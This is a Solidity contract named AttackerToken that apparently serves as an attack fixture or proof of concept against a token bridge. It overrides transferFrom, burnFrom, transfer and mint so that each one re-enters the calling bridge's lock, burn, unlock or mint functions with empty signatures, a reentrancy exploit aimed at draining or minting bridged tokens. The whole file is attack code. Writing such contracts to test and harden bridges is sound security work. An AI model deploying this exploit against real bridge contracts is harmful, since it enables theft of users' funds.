//SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import "../Token.sol";
import "../IBridge.sol";

contract AttackerToken is Token {
    constructor(
        string memory _name,
        string memory _symbol,
        address _owner
    ) Token(_name, _symbol, _owner) {}

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        IBridge.DepositData memory _depositData = IBridge.DepositData(
            to,
            address(this),
            msg.sender,
            amount,
            1
        );
        IBridge.Signature memory _signature = IBridge.Signature(0, "", "");
        IBridge(msg.sender).lock(_depositData, _signature);
        return true;
    }

    function burnFrom(address account, uint256 amount) public virtual override {
        IBridge.DepositData memory _depositData = IBridge.DepositData(
            account,
            address(this),
            msg.sender,
            amount,
            1
        );
        IBridge.Signature memory _signature = IBridge.Signature(0, "", "");
        IBridge(msg.sender).burn(_depositData, _signature);
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        IBridge.WithdrawData memory _withdrawData = IBridge.WithdrawData(
            address(this),
            "WShark",
            "WShark",
            amount
        );
        IBridge(msg.sender).unlock(_withdrawData);
        return true;
    }

    function mint(address to, uint256 amount) external override {
        IBridge.WithdrawData memory _withdrawData = IBridge.WithdrawData(
            address(this),
            "WShark",
            "WShark",
            amount
        );
        IBridge(msg.sender).mint(_withdrawData);
    }
}
